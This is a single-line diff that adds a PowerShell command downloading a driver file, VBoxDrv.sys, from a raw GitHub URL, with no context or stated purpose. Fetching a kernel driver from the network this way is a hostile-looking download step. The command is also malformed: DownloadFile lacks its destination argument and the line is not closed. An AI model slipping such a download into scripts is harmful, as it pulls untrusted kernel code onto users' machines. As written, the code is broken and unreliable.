@@ -1,0 +1,1 @@
+powershell -command "(new-object system.net.webclient).downloadfile('https://raw.githubusercontent.com/esg-sadmin/scripts/main/vt/VBoxDrv.sys')
